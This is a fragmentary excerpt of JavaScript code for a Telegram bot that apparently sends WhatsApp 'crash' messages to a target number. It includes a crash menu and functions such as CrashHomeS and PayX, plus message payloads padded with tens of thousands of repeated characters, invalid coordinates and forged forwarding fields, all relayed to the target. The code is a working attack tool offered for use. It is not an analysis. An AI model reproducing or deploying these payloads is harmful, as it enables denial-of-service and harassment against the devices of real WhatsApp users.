...
const randomImages = [
  ...
  "https://files.catbox.moe/jkth9e.jpg",
  "https://files.catbox.moe/nih6r9.jpg",
  "https://files.catbox.moe/b4mcmi.jpg",
  "https://files.catbox.moe/evibqp.jpg",
  "https://files.catbox.moe/6ngo7u.jpg",
  "https://files.catbox.moe/l1rnfj.jpg",
  "https://files.catbox.moe/5jtmk5.jpg",
  "https://files.catbox.moe/t974ib.jpg",
  "https://files.catbox.moe/4zqpza.jpg",
  "https://files.catbox.moe/ar2j9u.jpg",
  "https://files.catbox.moe/gqjqbz.jpg",
  "https://files.catbox.moe/jiqsek.jpg",
  "https://files.catbox.moe/s90zly.jpg",
  "https://files.catbox.moe/4v3261.jpg",
  "https://files.catbox.moe/rc9oin.jpg",
  "https://files.catbox.moe/ck5pzl.jpg",
  "https://files.catbox.moe/fg3ttf.jpg",
  "https://files.catbox.moe/x9vez2.jpg",
  "https://files.catbox.moe/u6y8js.jpg",
    ...
    if (action === "menuCrash") {
        return ctx.editMessageReplyMarkup({
            inline_keyboard: [
                ...
                [{ text: "「  🩸⃟ཀ ༚𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄🦠⃟͜͡-‣ཀꪸ」", callback_data: `crashBasic:${target}` }],
            ]
        });
    }
 ...
 viewOnceMessage: {
   groupStatusMessageV2: {
    message: {
      body: { text: "Getsuzo ‼️" },   
      locationMessage: {
      degreesLatitude: -99.9999,
      degreesLongtitude: -99.999999,
      name: "Getsuzo" + "꧀".repeat(900),
      address: `https://${"꧀".repeat(55000)}`,
      },
      contextInfo: {
      mentionedJid: [target],
      ...
      body: "",
      thumbnail: "777",
      renderLargerThumnail: false
      },
        isForwarded: true,
        forwardingScore: 999,
        stanzaId: "",
        sourceId: sock.generateMessageTag(),
        sourceUrl: "https://Wa.me/stickerpack/Getsuzo",
        remoteJid: target,
      },
    },
   },
...
async function SendPairing(target, Ptcp = false) {
  ...
  try {
    await sock.relayMessage(target, messageContent, Ptcp ? {
      participant: {
        jid: target
      }
    } : {});
...
async function CrashHomeS(target) {
try {
        const orderMsg = {
            orderMessage: {
                orderId: "88",
     ...
     console.log("succes sent");
        ...
        console.error("Error SendOrderMessage:", err);
    }
  }
  
async function PayX(target) {
  const Params = "{[(".repeat(2000);
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
